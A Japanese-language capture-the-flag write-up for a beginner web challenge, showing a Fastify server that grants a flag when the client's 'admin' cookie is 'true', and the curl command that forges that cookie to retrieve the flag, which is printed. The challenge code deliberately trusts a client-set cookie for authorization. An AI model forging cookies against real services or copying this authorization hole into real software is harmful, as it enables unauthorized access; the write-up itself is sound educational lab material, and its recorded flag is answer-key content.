# 🍪:Web:100pts
ある条件を満たすとフラグが得られるようです  
```javascript
import Fastify from "fastify";
import fastifyCookie from "@fastify/cookie";

const fastify = Fastify();
fastify.register(fastifyCookie);

fastify.get("/", async (req, reply) => {
  reply.setCookie('admin', 'false', { path: '/', httpOnly: true });
  if (req.cookies.admin === "true")
    reply.header("X-Flag", process.env.FLAG);
  return "can you get the flag?";
});

fastify.listen({ port: process.env.PORT, host: "0.0.0.0" });
```
_*完全なソースコードは以下からダウンロード可能です。_  

[cookie.tar.gz](cookie.tar.gz)  

[http://34.170.146.252:6407](http://34.170.146.252:6407)  

# Solution
ソースとURLが渡される。  
アクセスすると`can you get the flag?`と表示される。  
```bash
$ curl http://34.170.146.252:6407
can you get the flag?
```
ソースより`req.cookies.admin`が`true`であると`X-Flag`ヘッダでフラグが返されるようだ。  
```bash
$ curl http://34.170.146.252:6407 -H 'Cookie: admin=true' -I
HTTP/1.1 200 OK
x-flag: Alpaca{7h3_n4m3_c0m35_fr0m_B3cky}
content-type: text/plain; charset=utf-8
set-cookie: admin=false; Path=/; HttpOnly; SameSite=Lax
content-length: 21
Date: Mon, 03 Mar 2025 02:26:21 GMT
Connection: close
Keep-Alive: timeout=72
```
cookieをつけてcurlするとflagが得られた。  

## Alpaca{7h3_n4m3_c0m35_fr0m_B3cky}